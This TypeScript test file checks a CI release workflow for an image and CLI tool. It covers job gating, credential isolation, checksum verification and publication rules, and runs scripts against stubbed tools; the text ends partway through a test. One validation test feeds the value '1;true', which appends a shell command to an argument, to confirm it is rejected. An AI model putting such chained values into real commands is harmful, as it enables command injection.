import assert from 'node:assert/strict';
import { spawnSync, type SpawnSyncReturns } from 'node:child_process';
import { createHash } from 'node:crypto';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import test from 'node:test';
import { load } from 'js-yaml';
import { buildProgram } from '../../src/cli/main.ts';
import { fakeDeps } from '../support/deploy-harness.ts';

type Step = { name?: string; run?: string; uses?: string; env?: Record<string, string>; 'working-directory'?: string };
type Job = {
  if?: string;
  'runs-on'?: string;
  strategy?: { matrix: { include: { target: string; runner: string }[] } };
  needs?: string[] | string;
  uses?: string;
  environment?: string;
  permissions?: Record<string, string>;
  steps?: Step[];
};
const root = resolve(dirname(fileURLToPath(import.meta.url)), '../../../../..');
const workflowText = readFileSync(join(root, '.github/workflows/build_push.yaml'), 'utf8');
const workflow = load(workflowText) as { jobs: Record<string, Job>; concurrency: { group: string; 'cancel-in-progress': boolean } };
const scripts = join(root, 'source/idea/ideactl/scripts');
const REAL_JQ = spawnSync('bash', ['-c', 'command -v jq'], { encoding: 'utf8' }).stdout.trim();
assert.ok(REAL_JQ, 'jq is required to exercise the release scripts');

/** The run body of a named step, which must exist. */
function step(job: string, name: string): string {
  const run = workflow.jobs[job]?.steps?.find((candidate) => candidate.name === name)?.run;
  assert.ok(run, `${job}: ${name}`);
  return run;
}
const imageAction = load(readFileSync(join(root, '.github/actions/build_control_plane_image/action.yml'), 'utf8')) as { runs: { steps: Step[] } };
/** The run body of a named step of the shared image action. */
function actionStep(name: string): string {
  const run = imageAction.runs.steps.find((candidate) => candidate.name === name)?.run;
  assert.ok(run, `build_control_plane_image: ${name}`);
  return run;
}
const releaseCheck = step('build_image', 'Check the release is new');
const imageScript = actionStep('Build and test the image');
const imageNameGuard = step('build_image', 'Validate the image name');
const archiveCheck = step('publish_image', 'Verify the image archive');
const pushScript = step('publish_image', 'Push the tested image');
const candidateChecksums = step('publish_release_candidate', 'Verify and combine checksums');
const candidateRecord = step('publish_release_candidate', 'Record the candidate');
const candidatePublication = step('publish_release_candidate', 'Publish the release candidate');
const promoteFind = step('promote_release', 'Find the candidate built from this source');
const promoteDownload = step('promote_release', "Download and verify the candidate's files");
const promoteTag = step('promote_release', 'Tag the candidate image as the release');
const promotePublish = step('promote_release', 'Publish the release');

const DISPATCH_ONLY = "github.event_name == 'workflow_dispatch'";
const BUILD_JOBS = ['build_ideactl_artifacts', 'build_ideactl_linux_artifact', 'build_ideactl_windows_artifact'];
const TREE = 'tree-under-release';
const REPOSITORY = 'registry.example.invalid/idea/idea-control-plane';
// the registry returns a multi-arch index; its digest is the hash of these bytes
const INDEX = '{"schemaVersion":2,"mediaType":"application/vnd.oci.image.index.v1+json","manifests":[]}';
const DIGEST = `sha256:${createHash('sha256').update(INDEX).digest('hex')}`;
const CANDIDATE_IMAGE = `${REPOSITORY}@${DIGEST}`;
const LAYERS = JSON.stringify([`sha256:${'1'.repeat(64)}`, `sha256:${'2'.repeat(64)}`]);
const ADMIN = 'IDEA_DOCKER_REPO_DEFAULT="registry.example.invalid/idea/idea-control-plane"\nIDEA_IMAGE_DIGEST_DEFAULT=""\nIDEA_IMAGE_VERSION_FILE="/opt/idea/ideactl/dist/IDEA_VERSION.txt"\necho run\n';
const stamped = (digest: string) => ADMIN.replace('IDEA_IMAGE_DIGEST_DEFAULT=""', `IDEA_IMAGE_DIGEST_DEFAULT="${digest}"`);

test('publication requires both validation workflows and extracted artifact smoke tests', () => {
  assert.equal(workflow.jobs.checks?.uses, './.github/workflows/ideactl_checks.yaml');
  assert.equal(workflow.jobs.tests?.uses, './.github/workflows/unit_tests.yaml');
  for (const name of ['ideactl_checks', 'unit_tests']) {
    const called = load(readFileSync(join(root, `.github/workflows/${name}.yaml`), 'utf8')) as { on: Record<string, unknown> };
    assert.ok('workflow_call' in called.on);
  }
  assert.deepEqual(workflow.jobs.build_image?.needs, ['release_available', 'checks', 'tests', ...BUILD_JOBS]);
  assert.deepEqual(workflow.jobs.publish_image?.needs, ['build_image']);
  assert.deepEqual(workflow.jobs.publish_release_candidate?.needs, [...BUILD_JOBS, 'publish_image']);
  assert.deepEqual(workflow.jobs.promote_release?.needs, ['release_available']);
  assert.equal(workflow.concurrency['cancel-in-progress'], false);
  assert.ok(workflow.concurrency.group);
  assert.doesNotMatch(workflowText, /--clobber|release upload|release edit|release delete|gh api -X|--method/);
  for (const name of ['build_ideactl_artifacts', 'build_ideactl_linux_artifact']) {
    const smoke = workflow.jobs[name]?.steps?.find((candidate) => candidate.name?.startsWith('Test the extracted'))?.run;
    assert.ok(smoke);
    assert.match(smoke, /tar -xzf .*\.tar\.gz -C "\$SMOKE_ROOT"/);
    assert.match(smoke, /node test\/support\/release-smoke.ts "\$SMOKE_ROOT\/ideactl"/);
  }
  for (const match of workflowText.matchAll(/(?:source\/idea\/ideactl\/)?test\/[^\s]+\.yml/g)) {
    const path = match[0].startsWith('source/') ? match[0] : `source/idea/ideactl/${match[0]}`;
    assert.ok(readFileSync(join(root, path)).length > 0);
  }
});

test('only a dispatch builds, only a numbered dispatch publishes a candidate, only main promotes', () => {
  for (const name of [...BUILD_JOBS, 'build_image', 'publish_image']) assert.equal(workflow.jobs[name]?.if, DISPATCH_ONLY, name);
  assert.equal(
    workflow.jobs.publish_release_candidate?.if,
    "github.event_name == 'workflow_dispatch' && github.event.inputs.release_candidate != ''",
  );
  assert.equal(workflow.jobs.promote_release?.if, "github.event_name == 'push' && github.ref_name == 'main'");
  // Every job that can write a release or an image tag is one of the three gated jobs.
  for (const [name, job] of Object.entries(workflow.jobs)) {
    const body = (job.steps ?? []).map((candidate) => candidate.run ?? '').join('\n');
    if (/gh release create|imagetools create|skopeo copy/.test(body)) {
      assert.ok(['publish_image', 'publish_release_candidate', 'promote_release'].includes(name), name);
    }
  }
  // The released tags are written in exactly one place: promotion.
  const releaseTagWriters = Object.entries(workflow.jobs).filter(([, job]) =>
    (job.steps ?? []).some((candidate) => /for TAG in "v\$\{VERSION\}" "\$\{VERSION\}" latest; do\s+skopeo copy/.test(candidate.run ?? '')));
  assert.deepEqual(releaseTagWriters.map(([name]) => name), ['promote_release']);
});

test('native runners cover each release target and both publications include Windows checksums', () => {
  assert.deepEqual(workflow.jobs.build_ideactl_artifacts?.strategy?.matrix.include, [
    { target: 'darwin-arm64', runner: 'macos-15' },
  ]);
  assert.deepEqual(workflow.jobs.build_ideactl_linux_artifact?.strategy?.matrix.include, [
    { target: 'linux-arm64', runner: 'ubuntu-24.04-arm' }, { target: 'linux-amd64', runner: 'ubuntu-24.04' },
  ]);
  const windows = workflow.jobs.build_ideactl_windows_artifact;
  assert.equal(windows?.['runs-on'], 'windows-2025');
  assert.equal(workflow.jobs.build_image?.['runs-on'], 'ubuntu-24.04-arm', 'the image is built natively, never through emulation');
  const setup = readFileSync(join(root, '.github/actions/setup_dev_environment/action.yml'), 'utf8');
  assert.match(setup, /key: venv-clean-\$\{\{ runner\.os \}\}-\$\{\{ runner\.arch \}\}-/, 'the virtual environment cache is per architecture');
  assert.doesNotMatch(setup, /linux-x86_64/, 'the AWS CLI download follows the runner architecture');
  const smoke = windows?.steps?.find((candidate) => candidate.name?.startsWith('Test the extracted'))?.run ?? '';
  assert.match(smoke, /Expand-Archive/);
  assert.match(smoke, /node test\/support\/release-smoke.ts .*ideactl.exe/);
  assert.match(smoke, /LASTEXITCODE/);
  assert.equal(workflow.jobs.publish_release_candidate?.steps?.find((candidate) => candidate.name === 'Verify and combine checksums')?.['working-directory'], 'release');
  assert.match(candidateChecksums, /\.\/\*\.tar\.gz\.sha256 \.\/\*\.zip\.sha256/);
  assert.match(candidateChecksums, /sha256sum --check SHA256SUMS/);
  assert.match(promoteDownload, /sha256sum --check SHA256SUMS/);
  assert.match(candidatePublication, /release\/\*\.zip /);
  assert.match(candidatePublication, /release\/\*\.zip\.sha256/);
  assert.match(candidatePublication, /release\/SHA256SUMS/);
  // promotion publishes the list it built from the record, Windows archive and sidecar included
  assert.match(promotePublish, /release-publish\/\* /);
  assert.match(promoteDownload, /ideactl-v\$\{VERSION\}-windows-amd64\.zip/);
  assert.match(promotePublish, /unsigned.*SmartScreen.*Run anyway/);
  const container = workflow.jobs.build_ideactl_linux_artifact?.steps?.find((candidate) => candidate.name?.includes('container image'))?.run ?? '';
  assert.match(container, /dist\/release\/\$\{\{ matrix.target \}\}/);
});

/** Stand-in for gh, docker, git, aws and jq that logs every call and answers per test mode. */
const STUB = `#!${process.execPath}
const fs = require('node:fs');
const path = require('node:path');
const { spawnSync } = require('node:child_process');
const name = path.basename(process.argv[1]);
const args = process.argv.slice(2);
const previous = fs.readFileSync(process.env.COMMAND_LOG, 'utf8').trim().split('\\n').filter(Boolean).map(JSON.parse);
fs.appendFileSync(process.env.COMMAND_LOG, JSON.stringify([name, ...args]) + '\\n');
const mode = process.env.RELEASE_TEST_MODE;
const rcMode = process.env.RC_MODE || 'absent';
const releases = process.env.RELEASES_DIR;
function answer(state) {
  if (state === 'existing') process.exit(0);
  console.error(state === 'unauthorized' ? 'gh: Forbidden (HTTP 403)' : state === 'network' ? 'connection failed' : 'gh: Not Found (HTTP 404)');
  process.exit(1);
}
if (name === 'gh') {
  if (args[0] === 'api' && args[1].includes('/actions/runs/')) {
    const fields = ['.github/workflows/build_push.yaml', 'workflow_dispatch', 'success', 'example/project', 'run-commit'];
    if (mode === 'run-other-workflow') fields[0] = '.github/workflows/other.yaml';
    if (mode === 'run-failed') fields[2] = 'failure';
    console.log(fields.join('\t'));
    process.exit(0);
  }
  if (args[0] === 'api' && args[1].includes('/git/commits/')) {
    console.log(mode === 'run-other-tree' ? 'another-tree' : process.env.TREE);
    process.exit(0);
  }
  if (args[0] === 'run' && args[1] === 'download') {
    const source = path.join(releases, 'runs', args[2], args[args.indexOf('--name') + 1]);
    if (!fs.existsSync(source)) { console.error('no artifact matches'); process.exit(1); }
    fs.cpSync(source, args[args.indexOf('--dir') + 1], { recursive: true });
    process.exit(0);
  }
  if (args[0] === 'api' && args[1].includes('/git/ref/tags/')) answer(process.env.TAG_MODE || 'absent');
  if (args[0] === 'api') {
    const tag = args[1].split('/').pop();
    const candidate = /-rc\\./.test(tag);
    const earlier = previous.filter(c => c[0] === 'gh' && c[1] === 'api' && c[2].includes('/releases/tags/') && /-rc\\./.test(c[2].split('/').pop()) === candidate).length;
    const state = candidate ? rcMode : mode;
    if (state === 'late-existing') answer(earlier > 0 ? 'existing' : 'absent');
    answer(state);
  }
  if (args[0] === 'release' && args[1] === 'create') {
    if (mode === 'create-failure') process.exit(1);
    const folder = path.join(releases, args[2]);
    fs.mkdirSync(folder, { recursive: true });
    for (const file of args.slice(3, args.findIndex(a => a.startsWith('--')))) {
      const body = fs.readFileSync(file, 'utf8');
      fs.writeFileSync(path.join(folder, path.basename(file)), mode === 'readback-differs' && file.endsWith('candidate.json') ? body + ' ' : body);
    }
    process.exit(0);
  }
  if (args[0] === 'release' && args[1] === 'list') {
    const filter = args[args.indexOf('--jq') + 1];
    const result = spawnSync(process.env.REAL_JQ, ['-r', filter, path.join(releases, 'list.json')], { encoding: 'utf8' });
    process.stdout.write(result.stdout); process.stderr.write(result.stderr); process.exit(result.status);
  }
  if (args[0] === 'release' && args[1] === 'view') {
    if (mode === 'view-failure') { console.error('HTTP 502: Bad Gateway'); process.exit(1); }
    const login = mode === 'foreign-author' ? 'someone-else' : 'github-actions[bot]';
    if (!args.some(a => a.split(',').includes('assets'))) { console.log(login); process.exit(0); }
    console.log(login + '\t' + fs.existsSync(path.join(releases, args[2], 'candidate.json')));
    process.exit(0);
  }
  if (args[0] === 'release' && args[1] === 'download' && mode === 'download-failure' && args.includes('candidate.json')) {
    console.error('HTTP 502: Bad Gateway');
    process.exit(1);
  }
  if (args[0] === 'release' && args[1] === 'download') {
    const source = path.join(releases, args[2]);
    const destination = args[args.indexOf('--dir') + 1];
    const pattern = args.includes('--pattern') ? args[args.indexOf('--pattern') + 1] : undefined;
    const files = fs.existsSync(source) ? fs.readdirSync(source).filter(f => pattern === undefined || f === pattern) : [];
    if (files.length === 0) { console.error('no assets match the file pattern'); process.exit(1); }
    fs.mkdirSync(destination, { recursive: true });
    for (const f of files) fs.copyFileSync(path.join(source, f), path.join(destination, f));
    process.exit(0);
  }
  process.exit(0);
}
if (name === 'jq') {
  if (args.includes('.["containerimage.digest"]')) { console.log('sha256:control'); process.exit(0); }
  const result = spawnSync(process.env.REAL_JQ, args, { stdio: 'inherit' });
  process.exit(result.status);
}
if (name === 'git') {
  if (args[0] === 'rev-parse' && args[1] === 'HEAD^{tree}') { console.log(process.env.TREE); process.exit(0); }
  process.exit(1);
}
const registryFile = path.join(releases, 'registry.json');
const registry = () => fs.existsSync(registryFile) ? JSON.parse(fs.readFileSync(registryFile, 'utf8')) : {};
const sha = (body) => 'sha256:' + require('node:crypto').createHash('sha256').update(body).digest('hex');
// a writer that does not copy the manifest byte for byte serves a new index around it
const wrapped = (body) => JSON.stringify({ schemaVersion: 2, mediaType: 'application/vnd.oci.image.index.v1+json', manifests: [{ digest: sha(body) }] });
function serves(ref) {
  const stored = registry()[ref];
  if (stored !== undefined) return stored;
  if (ref.includes('@')) return ref.endsWith('@' + sha(process.env.INDEX)) ? process.env.INDEX : undefined;
  // an existing candidate's rc tag, made by an earlier run
  if (!/-rc\.[0-9]+$/.test(ref) || mode === 'rc-absent' || mode === 'rc-read-error') return undefined;
  return mode === 'rc-tag-other' ? wrapped('other') : process.env.INDEX;
}
function store(ref, body) {
  const state = registry();
  state[ref] = body;
  fs.writeFileSync(registryFile, JSON.stringify(state));
}
if (name === 'skopeo') {
  if (mode === 'push-failure') process.exit(1);
  const [source, destination] = args.slice(-2);
  const exact = args.includes('--preserve-digests');
  const body = source.startsWith('oci-archive:') ? process.env.INDEX : serves(source.slice('docker://'.length));
  if (body === undefined) process.exit(1);
  store(destination.slice('docker://'.length), exact && !(mode === 'registry-rewrites' && source.startsWith('docker://')) ? body : wrapped(body));
  process.exit(0);
}
if (name === 'docker') {
  if (args[0] === 'buildx' && args[1] === 'build' && mode === 'build-failure') process.exit(1);
  if (args[0] === 'buildx' && args[1] === 'build') {
    // the OCI archive: one manifest, named by the digest the registry later serves
    const dest = args.find(a => a.startsWith('type=oci,dest=')).slice('type=oci,dest='.length);
    const work = fs.mkdtempSync(path.join(path.dirname(dest), 'oci-'));
    const hash = (body) => 'sha256:' + require('node:crypto').createHash('sha256').update(body).digest('hex');
    const digest = hash(process.env.INDEX);
    const manifests = mode === 'two-manifests' ? [{ digest }, { digest }] : [{ digest }];
    fs.writeFileSync(path.join(work, 'index.json'), JSON.stringify({ manifests }));
    fs.mkdirSync(path.join(work, 'blobs/sha256'), { recursive: true });
    const config = JSON.stringify({ rootfs: { type: 'layers', diff_ids: JSON.parse(process.env.LAYERS) } });
    fs.writeFileSync(path.join(work, 'blobs/sha256', hash(config).slice(7)), config);
    fs.writeFileSync(path.join(process.env.RUNNER_TEMP, 'config-digest'), hash(config));
    fs.writeFileSync(path.join(work, 'blobs/sha256', digest.slice(7)), JSON.stringify({ config: { digest: hash(config) } }));
    // bare member names, as BuildKit's OCI exporter writes them: GNU tar does not match
    // ./index.json when asked for index.json, bsdtar does
    spawnSync('tar', ['-cf', dest, '-C', work, 'index.json', 'blobs'], { stdio: 'inherit' });
    process.exit(0);
  }
  if (args[0] === 'image' && args[1] === 'inspect') {
    const format = args[args.indexOf('--format') + 1];
    const layers = JSON.parse(process.env.LAYERS);
    if (format.includes('RootFS.Layers')) console.log(JSON.stringify(mode === 'loaded-mismatch' ? [...layers].reverse() : layers));
    else if (mode === 'config-mismatch' || mode === 'containerd-store') console.log('sha256:' + 'e'.repeat(64));
    else console.log(fs.readFileSync(path.join(process.env.RUNNER_TEMP, 'config-digest'), 'utf8'));
    process.exit(0);
  }
  if (args[0] === 'info') {
    console.log(mode === 'containerd-store' ? '[["driver-type","io.containerd.snapshotter.v1"]]' : '[["Backing Filesystem","extfs"]]');
    process.exit(0);
  }
  if (args[0] === 'buildx' && args[1] === 'imagetools' && args[2] === 'inspect') {
    if (mode === 'missing-image') process.exit(1);
    const ref = args[3];
    let body = serves(ref);
    if (body === undefined && mode === 'rc-read-error' && ref.includes('-rc.')) { console.error('ERROR: failed to do request: connection reset by peer'); process.exit(1); }
    if (body === undefined) { console.error('ERROR: ' + ref + ': not found'); process.exit(1); }
    if ((mode === 'digest-mismatch' && !ref.includes('-rc.') && !ref.includes('@')) ||
        (mode === 'rc-digest-mismatch' && ref.includes('-rc.'))) body = body.replace('[]', '[{}]');
    if (args.includes('--raw')) process.stdout.write(body);
    process.exit(0);
  }
  if (args[0] === 'buildx' && args[1] === 'imagetools' && args[2] === 'create') {
    const source = args.at(-1);
    const exact = args.includes('--prefer-index=false');
    for (let i = 0; i < args.length; i++) if (args[i] === '--tag') store(args[i + 1], exact ? serves(source) : wrapped(serves(source)));
    process.exit(0);
  }
  if (args[0] === 'run' && args[args.indexOf('--entrypoint') + 1] === 'cat') {
    if (mode === 'version-file-missing' || args.at(-1) !== '/opt/idea/ideactl/dist/IDEA_VERSION.txt') process.exit(1);
    console.log(mode === 'version-mismatch' ? '9.9.9' : '1.2.3');
    process.exit(0);
  }
  if (args[0] === 'run') {
    if (mode === 'smoke-failure' || (mode === 'image-check-failure' && args.includes('/tmp/image_check.sh')) || (mode === 'import-failure' && args.includes('python3.13')) ||
        (mode === 'control-failure' && args.includes('about')) || (mode === 'config-failure' && args.includes('generate'))) process.exit(1);
    if (args.includes('generate')) {
      const mount = args.find(a => a.endsWith(':/tmp/config'));
      fs.mkdirSync(path.join(mount.split(':')[0], 'config'), { recursive: true });
      fs.writeFileSync(path.join(mount.split(':')[0], 'config/idea.yml'), 'ok');
    }
  }
}
`;

type Run = { status: number | null; stdout: string; output: string };
type Release = {
  tag: string; prerelease: boolean; candidate?: Record<string, unknown>; assets?: Record<string, string>;
  /** the candidate run's release-record artifact; defaults to the release's own manifest and checksums */
  record?: Record<string, string> | null;
};

/** A scratch checkout with stubbed tools; scripts run in it in order, sharing files and one command log. */
class Harness {
  readonly directory = mkdtempSync(join(tmpdir(), 'release-pipeline-'));
  private readonly log = join(this.directory, 'commands.jsonl');
  private readonly releases = join(this.directory, '.releases');
  readonly output = join(this.directory, 'github-output');

  private readonly mode: string;

  constructor(mode: string, options: { missingFixture?: boolean; missingImageCheck?: boolean; releases?: Release[] } = {}) {
    this.mode = mode;
    const bin = join(this.directory, '.bin');
    mkdirSync(bin);
    writeFileSync(this.log, '');
    writeFileSync(this.output, '');
    // sleep is stubbed too, so read-back retries cost no time
    for (const name of ['gh', 'aws', 'docker', 'jq', 'git', 'skopeo', 'sleep']) writeFileSync(join(bin, name), STUB, { mode: 0o755 });
    mkdirSync(join(this.directory, '.runner-temp'));
    for (const name of ['dist', 'deployment/ecr/idea-control-plane', 'source/idea/ideactl/scripts', 'source/idea/ideactl/test/cli']) {
      mkdirSync(join(this.directory, name), { recursive: true });
    }
    for (const name of ['assert-new-release.sh', 'assert-new-candidate.sh', 'find-release-candidate.sh']) {
      cpSync(join(scripts, name), join(this.directory, 'source/idea/ideactl/scripts', name));
    }
    writeFileSync(join(this.directory, 'IDEA_VERSION.txt'), '1.2.3\n');
    writeFileSync(join(this.directory, 'idea-admin.sh'), ADMIN);
    writeFileSync(join(this.directory, 'dist/all-1.2.3.tar.gz'), 'archive');
    writeFileSync(join(this.directory, 'dist/idea-dcv-connection-gateway-1.2.3.tar.gz'), 'archive');
    if (!options.missingFixture) writeFileSync(join(this.directory, 'source/idea/ideactl/test/cli/shell-path-values.yml'), 'fixture');
    // the containers branch's in-image check, at the path it has once both branches are merged
    if (!options.missingImageCheck) writeFileSync(join(this.directory, 'deployment/ecr/idea-control-plane/image_check.sh'), 'exit 0\n');
    mkdirSync(this.releases);
    const list = (options.releases ?? []).map((release) => ({ tagName: release.tag, isPrerelease: release.prerelease }));
    writeFileSync(join(this.releases, 'list.json'), JSON.stringify(list));
    for (const release of options.releases ?? []) {
      const folder = join(this.releases, release.tag);
      mkdirSync(folder);
      for (const [file, body] of Object.entries(release.assets ?? {})) writeFileSync(join(folder, file), body);
      if (release.candidate) writeFileSync(join(folder, 'candidate.json'), JSON.stringify(release.candidate));
      const run = release.candidate?.run_id;
      if (typeof run === 'number' && release.record !== null) {
        const record = join(this.releases, 'runs', String(run), `release-record-attempt-${release.candidate?.run_attempt}`);
        mkdirSync(record, { recursive: true });
        const files = release.record ?? {
          'candidate.json': JSON.stringify(release.candidate), SHA256SUMS: release.assets?.['SHA256SUMS'] ?? '', 'idea-admin.sh': release.assets?.['idea-admin.sh'] ?? '',
        };
        for (const [file, body] of Object.entries(files)) writeFileSync(join(record, file), body);
      }
    }
  }

  run(script: string, env: Record<string, string> = {}, cwd = this.directory): Run {
    const result: SpawnSyncReturns<string> = spawnSync('bash', ['-c', script], {
      cwd, encoding: 'utf8',
      env: {
        ...process.env, PATH: `${join(this.directory, '.bin')}:${process.env.PATH}`, COMMAND_LOG: this.log, RELEASE_TEST_MODE: this.mode,
        REAL_JQ, RELEASES_DIR: this.releases, TREE, INDEX, LAYERS, GITHUB_OUTPUT: this.output,
        GITHUB_REPOSITORY: 'example/project', GITHUB_SHA: 'test-commit', GITHUB_RUN_ID: '5', GITHUB_RUN_ATTEMPT: '2',
        RUNNER_TEMP: join(this.directory, '.runner-temp'),
        ECR_REGISTRY: 'registry.example.invalid/idea', CONTROL_PLANE_IMAGE_NAME: 'idea-control-plane', RELEASE_CANDIDATE: '', ...env,
      },
    });
    return { status: result.status, stdout: result.stdout, output: result.stdout + result.stderr };
  }

  /** Runs steps in order, as a job does, stopping at the first failure. */
  steps(list: { script: string; env?: Record<string, string>; cwd?: string }[]): Run {
    let last: Run = { status: 0, stdout: '', output: '' };
    for (const item of list) {
      last = this.run(item.script, item.env, item.cwd ? join(this.directory, item.cwd) : this.directory);
      if (last.status !== 0) return last;
    }
    return last;
  }

  get commands(): string[][] {
    return readFileSync(this.log, 'utf8').trim().split('\n').filter(Boolean).map((line) => JSON.parse(line) as string[]);
  }

  close(): void {
    rmSync(this.directory, { recursive: true, force: true });
  }
}

function harness<T>(mode: string, body: (h: Harness) => T, options?: ConstructorParameters<typeof Harness>[1]): T {
  const h = new Harness(mode, options);
  try {
    return body(h);
  } finally {
    h.close();
  }
}

/** Every write of an image tag: an imagetools index, or a copy from one registry reference to another. */
const imagetoolsWrites = (commands: string[][]) =>
  commands.filter((args) => (args[0] === 'docker' && args[2] === 'imagetools' && args[3] === 'create') ||
    (args[0] === 'skopeo' && args[1] === 'copy' && args.at(-2)?.startsWith('docker://')));
const releaseWrites = (commands: string[][]) => commands.filter((args) => args[0] === 'gh' && args[1] === 'release' && args[2] === 'create');
const TARGETS = ['ideactl-v1.2.3-darwin-arm64.tar.gz', 'ideactl-v1.2.3-linux-amd64.tar.gz', 'ideactl-v1.2.3-linux-arm64.tar.gz', 'ideactl-v1.2.3-windows-amd64.zip'];
const RELEASED_TAGS = [`${REPOSITORY}:v1.2.3`, `${REPOSITORY}:1.2.3`, `${REPOSITORY}:latest`];

test('a re-run of a published candidate run is refused first, naming the attempt that published', () => {
  const guard = step('release_available', 'Refuse an existing release or candidate');
  harness('absent', (h) => {
    const result = h.run(guard, { RELEASE_CANDIDATE: '4', RC_MODE: 'existing', GITHUB_RUN_ATTEMPT: '2' });
    assert.notEqual(result.status, 0);
    assert.match(result.output, /Attempt 2 of this run stopped: an earlier attempt published candidate 4/);
    assert.match(result.output, /release_candidate=5/);
  });
  harness('absent', (h) => {
    const result = h.run(guard, { RELEASE_CANDIDATE: '4', RC_MODE: 'existing', GITHUB_RUN_ATTEMPT: '1' });
    assert.notEqual(result.status, 0);
    assert.doesNotMatch(result.output, /earlier attempt/);
  });
  // a re-run of an attempt that published nothing proceeds
  harness('absent', (h) => assert.equal(h.run(guard, { RELEASE_CANDIDATE: '4', GITHUB_RUN_ATTEMPT: '2' }).status, 0));
});

test('only an explicit missing release permits publication', () => {
  for (const mode of ['absent', 'existing', 'unauthorized', 'network']) {
    harness(mode, (h) => {
      const result = h.run('bash source/idea/ideactl/scripts/assert-new-release.sh');
      assert.equal(result.status, mode === 'absent' ? 0 : 1, result.output);
      assert.deepEqual(h.commands[0], ['gh', 'api', 'repos/example/project/releases/tags/v1.2.3']);
      if (mode === 'existing') assert.match(result.output, /already exists.*Refusing to overwrite/);
      if (mode === 'network' || mode === 'unauthorized') assert.match(result.output, /Could not verify/);
    });
  }
});

test('a candidate number is checked before any lookup, and only explicit absences of the release and the candidate pass', () => {
  for (const number of ['', '0', '-1', 'abc', '1.5', '01', '2 ', '1;true']) {
    harness('absent', (h) => {
      const result = h.run(`bash source/idea/ideactl/scripts/assert-new-candidate.sh ${JSON.stringify(number)}`);
      assert.notEqual(result.status, 0, `candidate '${number}'`);
      assert.equal(h.commands.length, 0, `candidate '${number}' must not reach GitHub`);
    });
  }
  for (const [release, candidate, status] of [
    ['absent', 'absent', 0], ['existing', 'absent', 1], ['unauthorized', 'absent', 1], ['network', 'absent', 1],
    ['absent', 'existing', 1], ['absent', 'unauthorized', 1], ['absent', 'network', 1],
  ] as const) {
    for (const number of ['1', '12']) {
      harness(release, (h) => {
        const result = h.run(`bash source/idea/ideactl/scripts/assert-new-candidate.sh ${number}`, { RC_MODE: candidate });
        assert.equal(result.status, status, `${release}/${candidate}: ${result.output}`);
        const lookups = h.commands.filter((args) => args[2]?.includes('/releases/tags/'));
        assert.deepEqual(lookups[0], ['gh', 'api', 'repos/example/project/releases/tags/v1.2.3']);
        if (release === 'absent') assert.deepEqual(lookups[1], ['gh', 'api', `repos/example/project/releases/tags/v1.2.3-rc.${number}`]);
        if (candidate === 'existing') assert.match(result.output, /already exists\. Use the next number/);
        if (candidate === 'network' || candidate === 'unauthorized') assert.match(result.output, /Could not verify that the release candidate is absent/);
      });
    }
  }
});

test('a dispatch must name a candidate or a private repository, never both and never neither', () => {
  for (const ref of ['main', 'patch']) {
    for (const [name, candidate, status] of [
      ['', '', 1], ['', '3', 0], ['control-test', '', 0], ['control-test', '3', 1],
    ] as const) {
      const result: SpawnSyncReturns<string> = spawnSync('bash', ['-c', imageNameGuard], {
        encoding: 'utf8',
        env: { ...process.env, GITHUB_EVENT_NAME: 'workflow_dispatch', GITHUB_REF_NAME: ref, CONTROL_PLANE_IMAGE_NAME: name, RELEASE_CANDIDATE: candidate },
      });
      assert.equal(result.status, status, `${ref} name='${name}' candidate='${candidate}': ${result.stderr}`);
    }
  }
});

test('the build job holds no credential, and only the release environment can push', () => {
  const build = workflow.jobs.build_image!;
  assert.deepEqual(build.permissions, { contents: 'read' });
  assert.doesNotMatch(JSON.stringify(build), /secrets\.|configure-aws-credentials|id-token/);
  for (const name of ['publish_image', 'promote_release']) {
    assert.equal(workflow.jobs[name]?.environment, 'release', name);
    assert.equal(workflow.jobs[name]?.permissions?.['id-token'], 'write', name);
  }
  // every other job is without an OIDC token, and ECR_ROLE appears only in the two release jobs
  for (const [name, job] of Object.entries(workflow.jobs)) {
    if (name === 'checks' || name === 'publish_image' || name === 'promote_release') continue;
    assert.notEqual(job.permissions?.['id-token'], 'write', name);
    assert.doesNotMatch(JSON.stringify(job), /ECR_ROLE/, name);
  }
  // the publish job runs no repository build or dependency tooling
  const publish = (workflow.jobs.publish_image?.steps ?? []).map((candidate) => `${candidate.uses ?? ''}\n${candidate.run ?? ''}`).join('\n');
  assert.doesNotMatch(publish, /setup_dev_environment|build_modules|mise|\bnpm\b|\byarn\b|\bpip\b|buildx build|docker run/);
});

/** Runs the release check and the build step, returning the outputs recorded for the publish job. */
function build(h: Harness, env: Record<string, string> = {}): { result: Run; outputs: Record<string, string> } {
  const result = h.steps([{ script: releaseCheck, env }, { script: imageScript, env: { CACHE_WRITE: 'true', ...env } }]);
  const outputs = Object.fromEntries(readFileSync(h.output, 'utf8').split('\n').filter(Boolean).map((line) => line.split(/=(.*)/s).slice(0, 2)));
  return { result, outputs };
}

test('the image is built once into an archive, smoked as that image, and its digests recorded', () => {
  harness('absent', (h) => {
    const { result, outputs } = build(h);
    assert.equal(result.status, 0, result.output);
    const commands = h.commands;
    const builds = commands.filter((args) => args[0] === 'docker' && args[2] === 'build');
    assert.equal(builds.length, 1);
    assert.ok(builds[0]?.includes('linux/arm64'));
    assert.ok(builds[0]?.includes('--provenance=false'));
    assert.ok(builds[0]?.some((arg) => arg.startsWith('type=oci,dest=')));
    assert.ok(builds[0]?.includes('type=docker,name=idea-control-plane-build:5-2'));
    assert.ok(builds[0]?.includes('type=gha,version=2,mode=max,scope=idea-control-plane'), 'intermediate stages are cached');
    const versionReads = commands.filter((args) => args[0] === 'docker' && args[1] === 'run' && args.includes('cat'));
    assert.deepEqual(versionReads.map((args) => args.slice(-2)), [['idea-control-plane-build:5-2', '/opt/idea/ideactl/dist/IDEA_VERSION.txt']]);
    const runs = commands.filter((args) => args[0] === 'docker' && args[1] === 'run' && !args.includes('cat'));
    // the in-image check runs as root, with no network, after the smoke tests
    const check = runs.at(-1)!;
    assert.deepEqual(check.slice(2, 9), ['--rm', '--network', 'none', '--user', '0', '--entrypoint', '/bin/bash']);
    assert.ok(check.some((arg) => arg.endsWith('/deployment/ecr/idea-control-plane/image_check.sh:/tmp/image_check.sh:ro')), check.join(' '));
    assert.deepEqual(check.slice(-2), ['idea-control-plane-build:5-2', '/tmp/image_check.sh']);
    const smoke = runs.slice(0, -1);
    assert.equal(smoke.length, 5);
    assert.ok(smoke.every((args) => !args.includes('--platform')), 'the image is built and smoked natively on the arm64 runner');
